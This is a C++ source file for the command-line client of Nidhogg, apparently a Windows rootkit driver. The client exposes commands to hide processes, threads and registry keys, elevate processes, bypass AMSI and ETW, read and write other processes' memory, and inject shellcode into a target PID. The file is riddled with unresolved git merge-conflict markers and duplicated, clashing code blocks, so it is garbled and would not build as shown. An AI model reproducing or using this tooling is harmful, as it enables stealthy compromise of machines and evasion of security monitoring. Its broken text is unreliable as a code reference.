#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <fstream>
#include "../NidhoggClient/Nidhogg.hpp"

enum class Options {
	Unknown,
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
	Add, Remove, Clear, Hide, Elevate, Query
=======
	Add, Remove, Clear, Hide, Elevate
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
	Add, Remove, Clear, Hide, Unhide, Elevate, Query
>>>>>>> c5ff028 (Seperated hidden and protected registry items)
=======
	Add, Remove, Clear, Hide, Unhide, Elevate, Query, Write, Read
>>>>>>> afd6daf (Nidhogg v0.2)
=======
	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read
>>>>>>> a20f2bb (Updated client)
=======
	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll
>>>>>>> 04ddc77 (Added usermode shellcode injection)
};

void PrintUsage() {
	std::cout << "[ * ] Possible usage:" << std::endl;
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
	std::cout << "\tNidhoggClient.exe shinject [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
	std::cout << "\tNidhoggClient.exe dllinject [pid] [dll path]" << std::endl;
}

int Error(int errorCode) {
	switch (errorCode) {
	case NIDHOGG_GENERAL_ERROR:
		std::cout << "[ - ] General error: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_ERROR_CONNECT_DRIVER:
		std::cout << "[ - ] Could not connect to driver: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_ERROR_DEVICECONTROL_DRIVER:
		std::cout << "[ - ] Failed to do operation: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_INVALID_COMMAND:
		std::cerr << "[ - ] Unknown command!" << std::endl;
		PrintUsage();
		break;
	case NIDHOGG_INVALID_OPTION:
		std::cerr << "[ - ] Invalid option!" << std::endl;
		PrintUsage();
		break;
	default:
		std::cout << "[ - ] Unknown error: " << GetLastError() << std::endl;
		break;
	}

	return 1;
}

<<<<<<< HEAD
int PrintUsage() {
	std::cout << "[ * ] Possible usage:" << std::endl;
<<<<<<< HEAD
<<<<<<< HEAD
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate | query] [pid| pid1 pid2...]" << std::endl;
=======
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate | query] [pid | pid1 pid2...]" << std::endl;
>>>>>>> 7327b97 (Prettified process features interaction)
	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
<<<<<<< HEAD
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | query] [key] [value]" << std::endl;
=======
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate] [pid| pid1 pid2...]" << std::endl;
	std::cout << "\tNidhoggClient.exe file [add | remove | clear] [path]" << std::endl;
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide] [key] [value]" << std::endl;
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
>>>>>>> c5ff028 (Seperated hidden and protected registry items)
	return 0;
=======
std::vector<byte> ConvertToVector(std::wstring rawPatch) {
	int b;
	std::vector<byte> vec;
	std::wstringstream rawPatchStream(rawPatch);
	std::wstringstream byteToAdd;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		byteToAdd << std::hex << i;

		if (rawPatchStream.peek() == L',') {
			rawPatchStream.ignore();
			byteToAdd >> b;
			vec.push_back(b);
			byteToAdd.clear();
		}
	}
	byteToAdd >> b;
	vec.push_back(b);

	return vec;
>>>>>>> da4b5b2 (Added patching to the usermode side)
}

int ConvertToInt(std::wstring rawString) {
	std::wstringstream rawPatchStream(rawString);
	std::wstringstream convertedString;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		convertedString << std::hex << i;
	}
	
	return _wtoi(convertedString.str().c_str());
}


int wmain(int argc, const wchar_t* argv[]) {
	std::vector<DWORD> pids;
	Options option;
	int success = NIDHOGG_INVALID_COMMAND;

	if (argc < 3)
		return Error(NIDHOGG_INVALID_COMMAND);

	if (_wcsicmp(argv[2], L"add") == 0)
		option = Options::Add;
	else if (_wcsicmp(argv[2], L"remove") == 0)
		option = Options::Remove;
	else if (_wcsicmp(argv[2], L"clear") == 0)
		option = Options::Clear;
	else if (_wcsicmp(argv[2], L"hide") == 0)
		option = Options::Hide;
	else if (_wcsicmp(argv[2], L"unhide") == 0)
		option = Options::Unhide;
	else if (_wcsicmp(argv[2], L"elevate") == 0)
		option = Options::Elevate;
	else if (_wcsicmp(argv[2], L"signature") == 0)
		option = Options::Signature;
	else if (_wcsicmp(argv[2], L"query") == 0)
		option = Options::Query;
	else if (_wcsicmp(argv[1], L"patch") == 0)
		option = Options::Patch;
	else if (_wcsicmp(argv[1], L"write") == 0)
		option = Options::Write;
	else if (_wcsicmp(argv[1], L"read") == 0)
		option = Options::Read;
	else if (_wcsicmp(argv[1], L"shinject") == 0)
		option = Options::InjectShellcode;
	else if (_wcsicmp(argv[1], L"dllinject") == 0)
		option = Options::InjectDll;
	else {
		std::cerr << "[ - ] Unknown option." << std::endl;
		return Error(NIDHOGG_INVALID_OPTION);
	}

	HANDLE hNidhogg = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hNidhogg == INVALID_HANDLE_VALUE)
		return Error(NIDHOGG_ERROR_CONNECT_DRIVER);

	switch (option) {
		case Options::Add:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessProtect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadProtect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = Nidhogg::FileUtils::NidhoggFileProtect(hNidhogg, _wcsdup(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Remove:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessUnprotect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadUnprotect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = Nidhogg::FileUtils::NidhoggFileUnprotect(hNidhogg, _wcsdup(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Clear:
		{
			if (_wcsicmp(argv[1], L"process") == 0)
				success = Nidhogg::ProcessUtils::NidhoggProcessClearAllProtection(hNidhogg);
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadClearAllProtection(hNidhogg);
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = Nidhogg::FileUtils::NidhoggFileClearAllProtection(hNidhogg);
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				success = Nidhogg::RegistryUtils::NidhoggRegistryClearAll(hNidhogg);
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Hide:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessHide(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadHide(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = NIDHOGG_INVALID_OPTION;
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryHideValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryHideKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Unhide:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessUnhide(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				std::cerr << "[ ! ] TBA" << std::endl;
				success = NIDHOGG_INVALID_OPTION;
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = NIDHOGG_INVALID_OPTION;
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnhideValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnhideKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Elevate:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessElevate(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				std::cerr << "[ ! ] TBA" << std::endl;
				success = NIDHOGG_INVALID_OPTION;
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Signature:
		{
			if (_wcsicmp(argv[1], L"process") == 0 && argc == 6) {
				int signatureType = _wtoi(argv[4]);
				int signatureSigner = _wtoi(argv[5]);
				
				if ((signatureType < PsProtectedTypeNone || signatureType > PsProtectedTypeProtected) ||
					(signatureSigner < PsProtectedSignerNone || signatureSigner > PsProtectedSignerMax)) {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}

				success = Nidhogg::ProcessUtils::NidhoggProcessSetProtection(hNidhogg, _wtoi(argv[3]), signatureType, signatureSigner);
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Query:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				std::vector result = Nidhogg::ProcessUtils::NidhoggQueryProcesses(hNidhogg);

				if (result[0] < 4) {
					success = result[0];
					break;
				}

				std::cout << "[ + ] Protected pids:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::cout << "\t" << result[i] << std::endl;
				}
				break;
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				std::vector result = Nidhogg::ProcessUtils::NidhoggQueryThreads(hNidhogg);

				if (result[0] < 4) {
					success = result[0];
					break;
				}

				std::cout << "[ + ] Protected tids:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::cout << "\t" << result[i] << std::endl;
				}
				break;
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				std::vector result = Nidhogg::FileUtils::NidhoggQueryFiles(hNidhogg);

				if (std::isdigit(result[0][0])) {
					success = std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Protected files:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}
				break;
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc != 4) {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}

				if (_wcsicmp(argv[3], L"value") == 0) {
					auto [protectedValues, protectedKeys] = Nidhogg::RegistryUtils::NidhoggRegistryQueryProtectedValues(hNidhogg);

					if (std::isdigit(protectedValues[0][0])) {
						success = std::stoi(protectedValues[0]);
						break;
					}

					std::cout << "[ + ] Protected registry values:" << std::endl;

					for (int i = 0; i < protectedValues.size(); i++) {
						std::wcout << "\tKeyName: " << protectedKeys[i] << std::endl;
						std::wcout << "\tValueName: " << protectedValues[i] << std::endl;
					}

					auto [hiddenValues, hiddenKeys] = Nidhogg::RegistryUtils::NidhoggRegistryQueryHiddenValues(hNidhogg);

					if (std::isdigit(hiddenValues[0][0])) {
						success = std::stoi(hiddenValues[0]);
						break;
					}

					std::cout << "[ + ] Hidden registry values:" << std::endl;

					for (int i = 0; i < hiddenValues.size(); i++) {
						std::wcout << "\tKeyName: " << hiddenKeys[i] << std::endl;
						std::wcout << "\tValueName: " << hiddenValues[i] << std::endl;
					}
					break;
				}
				else if (_wcsicmp(argv[3], L"key") == 0) {
					std::vector result = Nidhogg::RegistryUtils::NidhoggRegistryQueryProtectedKeys(hNidhogg);

					if (std::isdigit(result[0][0])) {
						success = std::stoi(result[0]);
						break;
					}

					std::cout << "[ + ] Protected registry keys:" << std::endl;

					for (int i = 0; i < result.size(); i++) {
						std::wcout << "\t" << result[i] << std::endl;
					}

					result = Nidhogg::RegistryUtils::NidhoggRegistryQueryHiddenKeys(hNidhogg);

					if (std::isdigit(result[0][0])) {
						success = std::stoi(result[0]);
						break;
					}

					std::cout << "[ + ] Hidden registry keys:" << std::endl;

					for (int i = 0; i < result.size(); i++) {
						std::wcout << "\t" << result[i] << std::endl;
					}
					break;
				}
				else {
					success = NIDHOGG_INVALID_OPTION;
				}
			}

			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}
<<<<<<< HEAD
		}
	}
<<<<<<< HEAD
	else {
<<<<<<< HEAD
		std::cout << "[ - ] Unknown option." << std::endl;
		return PrintUsage();
	}

	switch (option) {
	case Options::Add:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessProtect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NidhoggFileProtect(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryProtectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryProtectKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Remove:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessUnprotect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NidhoggFileUnprotect(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryUnprotectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryUnprotectKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Clear:
	{
		if (_wcsicmp(argv[1], L"process") == 0)
			success = NidhoggProcessClearAllProtection();
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NidhoggFileClearAllProtection();
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			success = NidhoggRegistryClearAll();
		}
		break;
	}
	case Options::Hide:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessHide(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryHideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryHideKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Unhide:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			std::cerr << "[ ! ] TBA" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryUnhideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryUnhideKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Elevate:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessElevate(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
<<<<<<< HEAD
		break;
	}

	case Options::Query:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			std::vector result = NidhoggQueryProcesses();

			if (result[0] < 4) {
				success = result[0];
				break;
			}

			std::cout << "[ + ] Protected pids:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::vector result = NidhoggQueryFiles();

			if (std::isdigit(result[0][0])) {
				success = std::stoi(result[0]);
				break;
			}

			std::cout << "[ + ] Protected files:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::wcout << "\t" << result[i] << std::endl;
			}
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc != 4) {
				PrintUsage();
				return 1;
			}

			if (_wcsicmp(argv[3], L"value") == 0) {
				auto [protectedValues, protectedKeys] = NidhoggRegistryQueryProtectedValues();

				if (std::isdigit(protectedValues[0][0])) {
					success = std::stoi(protectedValues[0]);
					break;
				}

				std::cout << "[ + ] Protected registry values:" << std::endl;

				for (int i = 0; i < protectedValues.size(); i++) {
					std::wcout << "\tKeyName: " << protectedKeys[i] << std::endl;
					std::wcout << "\tValueName: " << protectedValues[i] << std::endl;
				}

				auto [hiddenValues, hiddenKeys] = NidhoggRegistryQueryHiddenValues();

				if (std::isdigit(hiddenValues[0][0])) {
					success = std::stoi(hiddenValues[0]);
					break;
				}

				std::cout << "[ + ] Hidden registry values:" << std::endl;

				for (int i = 0; i < hiddenValues.size(); i++) {
					std::wcout << "\tKeyName: " << hiddenKeys[i] << std::endl;
					std::wcout << "\tValueName: " << hiddenValues[i] << std::endl;
				}

			}
			else if (_wcsicmp(argv[3], L"key") == 0) {
				std::vector result = NidhoggRegistryQueryProtectedKeys();

				if (std::isdigit(result[0][0])) {
					success = std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Protected registry keys:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}

				result = NidhoggRegistryQueryHiddenKeys();

				if (std::isdigit(result[0][0])) {
					success = std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Hidden registry keys:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}
			}
			else {
				PrintUsage();
				return 1;
			}
		}
=======
>>>>>>> 0a9676d (Pre version 0.1 (#6))
		break;
	}
=======
=======
	else if (_wcsicmp(argv[1], L"patch") == 0) {
<<<<<<< HEAD
>>>>>>> afd6daf (Nidhogg v0.2)
		if (argc != 6 && argc != 4)
			return PrintUsage();
=======
		if (argc != 6 && argc != 4) {
			success = NIDHOGG_INVALID_OPTION;
			goto CleanUp;
=======

		case Options::Patch:
		{
			if (argc != 6 && argc != 4) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int pid = _wtoi(argv[2]);

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[3], L"amsi") == 0) {
				success = Nidhogg::ModuleUtils::NidhoggAmsiBypass(hNidhogg, pid);
			}
			else if (_wcsicmp(argv[3], L"etw") == 0) {
				success = Nidhogg::ModuleUtils::NidhoggETWBypass(hNidhogg, pid);
			}
			else {
				std::wstring wFunctionName(argv[4]);
				std::string functionName(wFunctionName.begin(), wFunctionName.end());
				std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));

				success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
			}
			break;
>>>>>>> 04ddc77 (Added usermode shellcode injection)
		}
>>>>>>> a20f2bb (Updated client)

		case Options::Write:
		case Options::Read:
		{
			MODE mode;

			if (argc != 6) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[5], L"kernel") == 0)
				mode = MODE::KernelMode;
			else if (_wcsicmp(argv[5], L"user") == 0)
				mode = MODE::UserMode;
			else {
				std::cerr << "[ - ] Invalid mode." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int pid = _wtoi(argv[2]);

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int size = _wtoi(argv[4]);

			if (size == 0) {
				std::cerr << "[ - ] Invalid size." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int remoteAddress = ConvertToInt(argv[3]);

			if (remoteAddress == 0) {
				std::cerr << "[ - ] Invalid address." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[1], L"write") == 0)
				success = Nidhogg::ModuleUtils::NidhoggWriteData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
			else if (_wcsicmp(argv[1], L"read") == 0) {
				auto data = Nidhogg::ModuleUtils::NidhoggReadData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);

				if ((int)data < 5)
					success = (int)data;

				std::cout << "[ + ] You can access the data here" << std::endl;
			}
			break;
		}

		case Options::InjectShellcode:
		{
			PVOID parameter1 = NULL;
			PVOID parameter2 = NULL;
			PVOID parameter3 = NULL;

<<<<<<< HEAD
			success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
		}
>>>>>>> da4b5b2 (Added patching to the usermode side)
	}
	else {
		if (argc != 6) {
			success = NIDHOGG_INVALID_OPTION;
			goto CleanUp;
		}
		MODE mode;
=======
			int pid = _wtoi(argv[2]);
>>>>>>> 04ddc77 (Added usermode shellcode injection)

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			std::ifstream input(argv[3], std::ios::binary);

			if (input.bad()) {
				std::cerr << "[ - ] Invalid shellcode file." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			std::vector<unsigned char> shellcode(std::istreambuf_iterator<char>(input), {});

			if (argc >= 5) {
				parameter1 = (PVOID)argv[4];

				if (argc >= 6) {
					parameter2 = (PVOID)argv[5];

					if (argc == 7) {
						parameter3 = (PVOID)argv[6];
					}
				}
			}

			success = Nidhogg::ModuleUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3);
			break;
		}

		case Options::InjectDll:
		{
			std::cerr << "[ - ] TBD!" << std::endl;
			break;
		}
	}

	CloseHandle(hNidhogg);

	if (success != NIDHOGG_SUCCESS)
		return Error(success);

	std::cout << "[ + ] Operation succeeded." << std::endl;
	return success;
}